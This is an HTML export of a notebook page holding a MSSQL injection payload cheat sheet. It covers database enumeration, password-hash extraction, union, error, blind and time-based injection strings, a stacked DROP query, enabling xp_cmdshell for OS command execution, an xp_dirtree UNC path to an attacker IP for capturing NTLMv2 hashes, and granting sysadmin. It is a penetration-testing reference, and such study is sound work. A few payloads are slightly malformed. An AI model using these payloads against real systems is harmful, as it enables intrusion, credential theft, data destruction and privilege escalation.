<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MSSQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">MSSQL</h1><br/><strong><h1>MSSQL Injection</h1></strong><br /><br /><br /><h2>Summary</h2><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-comments">MSSQL comments</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-version">MSSQL version</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-database-name">MSSQL database name</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-databases">MSSQL List databases</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-columns">MSSQL List columns</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-list-tables">MSSQL List tables</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-extract-userpassword">MSSQL Extract user/password</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-union-based">MSSQL Union Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based">MSSQL Error Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-blind-based">MSSQL Blind Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-time-based">MSSQL Time Based</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-stacked-query">MSSQL Stacked query</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution">MSSQL Command execution</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path">MSSQL UNC path</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-make-user-dba-db-admin">MSSQL Make user DBA</a><br /><br /><br /><br /><h2>MSSQL comments</h2><br />-- comment goes here<br />/* comment goes here */<br /><br /><br /><h2>MSSQL version</h2><br />SELECT @@version<br /><br /><br /><h2>MSSQL database name</h2><br />SELECT DB_NAME()<br /><br /><br /><h2>MSSQL List databases</h2><br />SELECT name FROM master..sysdatabases;<br />SELECT DB_NAME(N); — for N = 0, 1, 2, …<br /><br /><br /><h2>MSSQL List columns</h2><br />SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only<br />SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable<br /><br />SELECT table_catalog, column_name FROM information_schema.columns<br /><br /><br /><h2>MSSQL List tables</h2><br />SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views<br />SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;<br />SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable<br /><br />SELECT table_catalog, table_name FROM information_schema.columns<br /><br /><br /><h2>MSSQL Extract user/password</h2><br />MSSQL 2000:<br />SELECT name, password FROM master..sysxlogins<br />SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)<br /><br />MSSQL 2005<br />SELECT name, password_hash FROM master.sys.sql_logins<br />SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins<br /><br /><br /><h2>MSSQL Union Based</h2><br />-- extract databases names<br />$ SELECT name FROM master..sysdatabases<br />[*] Injection<br />[*] msdb<br />[*] tempdb<br /><br />-- extract tables from Injection database<br />$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'<br />[*] Profiles<br />[*] Roles<br />[*] Users<br /><br />-- extract columns for the table Users<br />$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')<br />[*] UserId<br />[*] UserName<br /><br />-- Finally extract the data<br />$ SELECT  UserId, UserName from Users<br /><br /><br /><h2>MSSQL Error based</h2><br />For integer inputs : convert(int,@@version)<br />For integer inputs : cast((SELECT @@version) as int)<br /><br />For string inputs   : ' + convert(int,@@version) + '<br />For string inputs   : ' + cast((SELECT @@version) as int) + '<br /><br /><br /><h2>MSSQL Blind based</h2><br />SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'<br /><br />WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)<br />SELECT message FROM data WHERE row = 1 and message like 't%'<br /><br /><br /><h2>MSSQL Time based</h2><br />ProductID=1;waitfor delay '0:0:10'--<br />ProductID=1);waitfor delay '0:0:10'--<br />ProductID=1';waitfor delay '0:0:10'--<br />ProductID=1');waitfor delay '0:0:10'--<br />ProductID=1));waitfor delay '0:0:10'--<br /><br />IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                              comment:   --<br /><br /><br /><h2>MSSQL Stacked Query</h2><br />Use a semi-colon ";" to add another query<br />ProductID=1; DROP members--<br /><br /><br /><h2>MSSQL Command execution</h2><br />EXEC xp_cmdshell "net user";<br />EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';<br />EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)<br />EXEC sp_configure 'show advanced options',1;<br />RECONFIGURE;<br />EXEC sp_configure 'xp_cmdshell',1;<br />RECONFIGURE;To interact with the MSSQL instance.<br />sqsh -S 192.168.1.X -U sa -P superPassword<br />python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758<br /><br /><br /><h2>MSSQL UNC Path</h2><br />MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the <code>xp_dirtree</code> function to list the files in our SMB share and grab the NTLMv2 hash.<br />1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- <br /><br /><br /><h2>MSSQL Make user DBA (DB admin)</h2><br />EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;<br /><br /><br /><h2>References</h2><br />• <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentest Monkey - mssql-sql-injection-cheat-sheet</a><br />• <a href="http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/">Sqlinjectionwiki - MSSQL</a><br />• <a href="https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20%E2%80%9COrder%20By%E2%80%9D%20clause%20(MSSQL).pdf">Error Based - SQL Injection </a><br /></div></body></html>